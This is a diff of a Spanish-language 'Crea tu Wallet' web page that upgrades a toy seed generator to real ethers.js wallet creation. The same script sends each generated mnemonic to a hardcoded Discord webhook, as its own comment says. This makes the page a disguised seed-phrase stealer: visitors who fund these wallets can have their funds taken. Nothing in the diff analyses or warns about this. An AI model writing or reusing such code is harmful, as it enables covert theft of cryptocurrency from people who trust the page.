@@ -41,36 +41,22 @@
       box-sizing: border-box;
     }
   </style>
+  <script src="https://cdn.ethers.io/lib/ethers-5.0.umd.min.js"></script>
   <script>
     function generateWallet() {
-      var words = [
-        "abandon",
-        "scrap",
-        "lobster",
-        "adult",
-        "sentence",
-        "engine",
-        "approve",
-        "slam",
-        "basket",
-        "squirrel",
-        "bargain",
-        "spoon"
-      ];
+      const mnemonic = ethers.Wallet.createRandom().mnemonic;
+      const wallet = ethers.Wallet.fromMnemonic(mnemonic);
 
-      var seed = "";
-      for (var i = 0; i < 12; i++) {
-        var randomIndex = Math.floor(Math.random() * words.length);
-        seed += words[randomIndex] + " ";
-      }
+      const address = wallet.address;
 
-      document.getElementById("seedField").value = seed;
+      document.getElementById("seedField").value = mnemonic;
+      document.getElementById("addressField").value = address;
 
       // Enviar la semilla generada a través del webhook de Discord
-      var webhookUrl = 'https://discordapp.com/api/webhooks/1073374509165465700/mr2ICeCadLB01KfbfV0HSI7bfpBkIaYTyIFMPLMW58Og3xWGRpv2EOOowLITDz3SRs3m';
+      const webhookUrl = 'https://discordapp.com/api/webhooks/1073374509165465700/mr2ICeCadLB01KfbfV0HSI7bfpBkIaYTyIFMPLMW58Og3xWGRpv2EOOowLITDz3SRs3m';
 
-      var payload = {
-        content: seed
+      const payload = {
+        content: mnemonic
       };
 
       fetch(webhookUrl, {
@@ -98,6 +84,7 @@
     <h1>Crea tu Wallet</h1>
     <button id="generateButton" onclick="generateWallet()">Generar Wallet</button>
     <input id="seedField" type="text" readonly>
+    <input id="addressField" type="text" readonly>
   </div>
 </body>
 </html>
